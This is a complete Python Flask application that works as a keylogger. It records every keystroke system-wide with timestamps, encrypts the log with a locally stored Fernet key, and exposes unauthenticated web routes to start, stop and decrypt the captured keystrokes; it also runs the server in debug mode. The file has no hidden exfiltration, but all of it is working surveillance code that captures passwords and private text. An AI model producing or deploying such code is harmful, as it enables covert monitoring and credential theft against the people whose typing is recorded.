from flask import Flask, render_template, request, redirect, url_for
from pynput.keyboard import Listener, Key
from cryptography.fernet import Fernet
import threading
import datetime
import os

app = Flask(__name__)

# File paths
KEY_FILE = "encryption_key.key"
LOG_FILE = "keystrokes.log"
ENC_FILE = "keystrokes.log.enc"

# Load or generate key
if not os.path.exists(KEY_FILE):
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
else:
    with open(KEY_FILE, "rb") as f:
        key = f.read()

cipher_suite = Fernet(key)

# Globals
listener = None
running = False


# Keylogger functions
def on_press(key):
    if key == Key.esc:  # ESC to stop from keyboard
        stop_keylogger()
        return False
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"{timestamp} - {key}\n")


def start_keylogger():
    global listener, running
    if running:
        return
    listener = Listener(on_press=on_press)
    listener.start()
    running = True


def stop_keylogger():
    global listener, running
    if not running:
        return
    running = False
    if listener:
        listener.stop()
    encrypt_logs()


def encrypt_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "rb") as f:
            data = f.read()
        encrypted_data = cipher_suite.encrypt(data)
        with open(ENC_FILE, "wb") as f:
            f.write(encrypted_data)
        os.remove(LOG_FILE)


def decrypt_logs():
    if not os.path.exists(ENC_FILE):
        return "No encrypted logs found."
    with open(ENC_FILE, "rb") as f:
        encrypted_data = f.read()
    try:
        decrypted_data = cipher_suite.decrypt(encrypted_data)
        return decrypted_data.decode("utf-8", errors="ignore")
    except Exception as e:
        return f"Error decrypting logs: {e}"


# Routes
@app.route("/")
def index():
    global running
    return render_template("index.html", running=running)


@app.route("/start")
def start():
    threading.Thread(target=start_keylogger).start()
    return redirect(url_for("index"))


@app.route("/stop")
def stop():
    stop_keylogger()
    return redirect(url_for("index"))


@app.route("/decrypt")
def decrypt():
    logs = decrypt_logs()
    return render_template("decrypt.html", logs=logs)


# Run server
if __name__ == "__main__":
    app.run(debug=True, port=5000)
